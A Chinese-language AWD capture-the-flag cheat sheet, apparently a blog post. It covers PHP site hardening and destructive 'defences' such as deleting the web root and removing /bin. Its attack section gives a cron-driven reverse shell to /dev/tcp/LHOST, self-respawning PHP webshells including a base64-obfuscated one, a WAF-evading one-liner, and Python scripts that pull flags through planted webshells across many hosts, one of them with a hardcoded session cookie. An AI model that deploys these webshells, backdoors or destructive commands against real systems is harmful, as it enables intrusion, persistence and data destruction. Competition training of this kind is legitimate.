+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E -rn &quot;字符串1|字符串2|字符串3|&quot;  文件名</span><br></pre></td></tr></table></figure>
+
+<p>一条命令批量加固php代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/原字符串/新字符串/g&quot; `grep 原字符串 --include=*.php -rl 所在目录`</span><br></pre></td></tr></table></figure>
+
+<p>注释所有关键函数</p>
+<blockquote>
+<p>注释include需注意，可能会导致网站加载不出来</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/eval/evaleval/g" `grep eval -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/system/systemsystem/g" `grep system -rl --include=*.php /var/www/html`</span><br></pre></td></tr></table></figure>
+
+<p>注释掉入口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/_GET/GET/g" `grep _GET -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/_POST/POST/g" `grep _POST -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/_REQUEST/REQUEST/g" `grep _REQUEST -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/_FILES/FILES/g" `grep _FILES -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/_SERVER/SERVER/g" `grep _SERVER -rl --include=*.php /var/www/html`</span><br><span class="line"></span><br><span class="line">还原</span><br><span class="line">sed -i "s/GET/_GET/g" `grep GET -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/POST/_POST/g" `grep POST -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/REQUEST/_REQUEST/g" `grep REQUEST -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/FILES/_FILES/g" `grep FILES -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/SERVER/_SERVER/g" `grep SERVER -rl --include=*.php /var/www/html`</span><br></pre></td></tr></table></figure>
+
+<p>命令执行漏洞函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">passthru()</span><br><span class="line">(需要加echo 才能显示结果)</span><br><span class="line">exec()</span><br><span class="line">shell_exec() </span><br><span class="line">ecntl_exec()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure>
+
+<p>代码执行函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">create_function()</span><br><span class="line">array_map()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_filter()</span><br><span class="line">usort()</span><br><span class="line">uasort()</span><br></pre></td></tr></table></figure>
+
+<p>文件包含函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure>
+
+<p>文件读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fopen()</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetss()</span><br><span class="line">readfile()</span><br><span class="line">parse_ini_file()</span><br><span class="line">show_source()</span><br><span class="line">highlight_file()</span><br></pre></td></tr></table></figure>
+
+<p>文件上传函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file</span><br></pre></td></tr></table></figure>
+
+<p>文件删除</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unlink()</span><br><span class="line">session_destroy()</span><br></pre></td></tr></table></figure>
+
+<p>变量覆盖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">extract()</span><br><span class="line">parse_str()</span><br><span class="line">import_request_variables()</span><br><span class="line">foreach()</span><br></pre></td></tr></table></figure>
+
+<p>sql注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli</span><br></pre></td></tr></table></figure>
+
+<p>其他危险函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy </span><br><span class="line">unserialize()</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+
+<p>第三种：删站&amp;赋予不可访问权限</p>
+<blockquote>
+<p>简单粗暴，直接让对手访问不了，但是可能会被裁判服务器check，导致扣分。</p>
+</blockquote>
+<p>删除网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/www/html/*</span><br></pre></td></tr></table></figure>
+
+<p>赋予网站目录 000 权限 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 000 /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>重启网页服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
+
+<p><strong>JSP网站加固</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request </span><br><span class="line">upload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/request/requestrequest/g" `grep request -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/upload/uploadupload/g" `grep upload -rl --include=*.php /var/www/html`</span><br></pre></td></tr></table></figure>
+
+<p><strong>Asp加固</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request</span><br><span class="line">HttpContext</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/Request/RequestRequest/g" `grep Request -rl --include=*.php /var/www/html`</span><br><span class="line">sed -i "s/HttpContext/HttpContextHttpContext/g" `grep HttpContext -rl --include=*.php /var/www/html`</span><br></pre></td></tr></table></figure>
+
+<h5 id="加固数据库"><a href="#加固数据库" class="headerlink" title="加固数据库"></a>加固数据库</h5><p>更改数据库密码<br>第一种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p [默认密码]</span><br><span class="line">use mysql;</span><br><span class="line">更改密码</span><br><span class="line">update user set password = password(&quot;yangfan&quot;) where User = &apos;root&apos;;</span><br><span class="line">刷新权限</span><br><span class="line">flush privileges;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>第二种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update user set password = password(&quot;yangfan&quot;) where user = &apos;root&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>mysql 5.7 修改密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=password(&apos;123qwe&apos;) where user=&apos;root&apos; and Host = &apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>mysql数据库开启远程连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set host=&apos;%&apos; where host=&apos;localhost&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>mysql数据关闭远程连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update use set host=&apos;localhost&apos; where host=&apos;%&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<h5 id="加固ftp服务"><a href="#加固ftp服务" class="headerlink" title="加固ftp服务"></a>加固ftp服务</h5><p>修改登录密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd ftpuser</span><br></pre></td></tr></table></figure>
+
+<h5 id="关闭不需要的服务和守护进程"><a href="#关闭不需要的服务和守护进程" class="headerlink" title="关闭不需要的服务和守护进程"></a>关闭不需要的服务和守护进程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/vsftpd stop </span><br><span class="line">/etc/init.d/smb stop </span><br><span class="line">/etc/init.d/sendmail stop</span><br></pre></td></tr></table></figure>
+
+<p>查看守护进程（如果有的话）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/xinetd.d/ </span><br><span class="line">ls </span><br><span class="line">rm -rf xx</span><br></pre></td></tr></table></figure>
+
+<h5 id="开启内存地址随机化（防止pwn程序的利用）"><a href="#开启内存地址随机化（防止pwn程序的利用）" class="headerlink" title="开启内存地址随机化（防止pwn程序的利用）"></a>开启内存地址随机化（防止pwn程序的利用）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space	// 0是关闭，1是半随机，2是全随机</span><br></pre></td></tr></table></figure>
+
+<h5 id="自启动相关"><a href="#自启动相关" class="headerlink" title="自启动相关"></a><strong>自启动相关</strong></h5><p><strong>禁用启动项</strong></p>
+<p><strong>开机自启动</strong></p>
+<p>chkconfig 命令<br>开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig 服务名   on</span><br></pre></td></tr></table></figure>
+
+<p>关闭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig 服务名 off</span><br></pre></td></tr></table></figure>
+
+<h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><p>iptables 命令</p>
+<h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontable</span><br><span class="line">-e 编辑crontab 的工作内容</span><br><span class="line">-l 查阅crontab 的工作内容</span><br><span class="line">-r 删除所有的crontab工作内容</span><br></pre></td></tr></table></figure>
+
+<p>cat 一次性输入全部内容（在纯linux 下  不能查看前面的内容）<br>more 仅能向前移动，却不能向后移动<br>less 用来查看一页不能完全显示的文件<br>空格 向下翻页<br>n      向上翻页</p>
+<h5 id="移动系统命令（最后的大招）"><a href="#移动系统命令（最后的大招）" class="headerlink" title="移动系统命令（最后的大招）"></a>移动系统命令（最后的大招）</h5><p>将 /bin，/sbin，/usr/bin 下的全部程序移走，即使攻击者突破了前面的防守但是拿到shell后发现并不能执行系统命令，从而拿不到咱们的flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/tmp </span><br><span class="line">cd /etc/tmp </span><br><span class="line">mkdir b </span><br><span class="line">mkdir sb </span><br><span class="line">mkdir ub </span><br><span class="line">cp /bin/* /etc/tmp/b </span><br><span class="line">cp /sbin/* /etc/tmp/sb </span><br><span class="line">cp /usr/bin/* /etc/tmp/ub </span><br><span class="line">cd /etc/tmp/b </span><br><span class="line">./rm -rf /bin/* </span><br><span class="line">./rm -rf /sbin/* </span><br><span class="line">./rm -rf /usr/bin/* </span><br><span class="line">cd /etc/tmp/b </span><br><span class="line">history -c </span><br><span class="line"># 禁用cd 命令</span><br><span class="line">enable -n cd </span><br><span class="line">enable -n echo </span><br><span class="line">enable -n history</span><br></pre></td></tr></table></figure>
+
+<p>把系统命令移走后，清空历史命令记录然后将cd等内建命令禁用</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="权限维持-后门技术"><a href="#权限维持-后门技术" class="headerlink" title="权限维持/后门技术"></a>权限维持/后门技术</h4><h5 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h5><p>在/etc/networkt下写入反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/networkt</span><br><span class="line">写入</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/LHOST/PROT 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/networkt</span><br></pre></td></tr></table></figure>
+
+<p>写入/etc/crontab 或者 crontab -e </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root /etc/networkt</span><br></pre></td></tr></table></figure>
+
+<h5 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $file = <span class="string">'./.index.php'</span>;</span><br><span class="line">    $code = <span class="string">'&lt;?php if(md5($_POST["pass"])=="361a8e7255c308e4362fff2ca3e726ff")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        usleep(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//马儿用法：POST::?pass=fany&amp;a=command</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   file_put_contents(<span class="string">'.1ndex.php'</span>,base64_decode(<span class="string">'PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get：pass=ocean888@.cn</span><br><span class="line"></span><br><span class="line">post：cmd=system(“ls”);</span><br></pre></td></tr></table></figure>
+
+<h5 id="linux命令不死马"><a href="#linux命令不死马" class="headerlink" title="linux命令不死马"></a>linux命令不死马</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true;do echo &apos;&lt;?php eval($_POST[&quot;x&quot;]);?&gt;&apos; &gt; x.php;sleep 1;done</span><br></pre></td></tr></table></figure>
+
+<h5 id="过盾一句话"><a href="#过盾一句话" class="headerlink" title="过盾一句话"></a>过盾一句话</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);print_r(`$a`)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k);?&gt;</span><br><span class="line"></span><br><span class="line">$a=1;$b=&quot;a=&quot;.$_GET[&apos;a&apos;];parse_str($b);$k=(`$a`);header(&apos;cookie:&apos;.$k);</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量GETflag方法"><a href="#批量GETflag方法" class="headerlink" title="批量GETflag方法"></a>批量GETflag方法</h4><p>模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(url)</span>:</span></span><br><span class="line">    resp = request.get(url)</span><br><span class="line">    flag = re.search(flag匹配规则, resp.text)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># ip池</span></span><br><span class="line">    ipList = [<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>]</span><br><span class="line">    <span class="comment"># payload</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    <span class="comment"># flag存储</span></span><br><span class="line">    flagList = []</span><br><span class="line">    <span class="comment"># 遍历</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ipList:</span><br><span class="line">            url = <span class="string">"192.168.1."</span>+str(i)+payload</span><br><span class="line">            flag = getFlag(url)</span><br><span class="line">            print(url, flag)</span><br><span class="line">            flagList.append(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">print(flagList)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>核心的两句话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = request.get(url+payload)</span><br><span class="line">flag = re.findall(<span class="string">r"flag&#123;.+&#125;"</span>, res.text)</span><br></pre></td></tr></table></figure>
+
+<h5 id="批量获取提交flag脚本"><a href="#批量获取提交flag脚本" class="headerlink" title="批量获取提交flag脚本"></a>批量获取提交flag脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(url)</span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"><span class="comment"># 获取flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(html)</span>:</span></span><br><span class="line">    flag = re.search(<span class="string">"flag&#123;[.*&#125;"</span>,html).group()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="comment"># 提交flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submib_Flag</span><span class="params">(ip,flag)</span>:</span></span><br><span class="line">    url = <span class="string">"http://172.15.91.101/lms/portal/sp/hz_flag.php"</span>  <span class="comment"># flag提交地址</span></span><br><span class="line">    data = &#123;<span class="string">"melee_ip"</span>:<span class="string">""</span>,<span class="string">"melee_flag"</span>:<span class="string">""</span>&#125;</span><br><span class="line">    data[<span class="string">'melee_ip'</span>] = ip <span class="comment"># 靶机ip</span></span><br><span class="line">    data[<span class="string">'melee_flag'</span>] = flag <span class="comment"># 该靶机上flag</span></span><br><span class="line">    print(flag)</span><br><span class="line">    header = &#123;<span class="string">"cookie"</span>:<span class="string">"SSCSum=1; lms_login_name=cqipc1; zlms-sid=ruf8d3qk28iqtooa52fbsmke01; webcs_test_cookie=lms_cookie_checker"</span>&#125;</span><br><span class="line">    resp = requests.post(url,data=data,headers=header)</span><br><span class="line">    <span class="comment">#print(len(resp.text))</span></span><br><span class="line">    <span class="comment"># 返回页面提示</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"您已提交过当前IP和FLAG，请确认！"</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        print(<span class="string">"\033[1;33m已提交过\033[0m"</span>)</span><br><span class="line">    <span class="keyword">elif</span>  <span class="string">"您提交得FLAG错误，请继续努力"</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        print(<span class="string">"\033[1;31m提交错误\033[0m"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">"恭喜您答对了"</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        print(<span class="string">"\033[1;32m提交成功\033[0m"</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(resp.text) == <span class="number">1744</span>:</span><br><span class="line">        print(<span class="string">"\033[1;31;30m未登录\033[0m"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="comment"># 暂停10s</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> range(<span class="number">101</span>,<span class="number">109</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ip = <span class="string">"172.20."</span>+str(ip)+<span class="string">".101"</span></span><br><span class="line">                print(<span class="string">"This:"</span>+ip)</span><br><span class="line">                <span class="comment"># 第一个flag</span></span><br><span class="line">                url_payload1 = <span class="string">"http://"</span>+ip+<span class="string">"/W3bShell/webshell.php?a=cat /flag.txt"</span></span><br><span class="line">                submib_Flag(ip,getFlag(request(url_payload1)))</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 第二个flag</span></span><br><span class="line">                url_payload2 = <span class="string">"http://"</span>+ip+<span class="string">"/W3bShell/webshell.php?a=cat /var/www/admin/flag2.txt"</span></span><br><span class="line">                submib_Flag(ip,getFlag(request(url_payload2)))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h5 id="web漏洞获取flag"><a href="#web漏洞获取flag" class="headerlink" title="web漏洞获取flag"></a>web漏洞获取flag</h5><p><strong>写批量提交的条件</strong></p>
+<blockquote>
+<p>知道赛场所有靶机ip地址<br>知道获取flag的payload</p>
+</blockquote>
+<p>payload种类：<br>命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>代码执行(用下面方式 弥补 命令执行带参数命令 不能回显的缺陷)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCdjYXQgL2ZsYWcudHh0Jyk7</span><br></pre></td></tr></table></figure>
+
+<p>文件包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../flag.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="ssh获取flag"><a href="#ssh获取flag" class="headerlink" title="ssh获取flag"></a>ssh获取flag</h5><p>shell写批量登录ssh脚本拿flag的条件</p>
+<blockquote>
+<p>知道所有靶机ip地址<br>知道ssh密码<br>知道flag位置</p>
+</blockquote>
+<h3 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h3><blockquote>
+<p>注意权限问题：那些尽量选用低权限能用的</p>
+</blockquote>
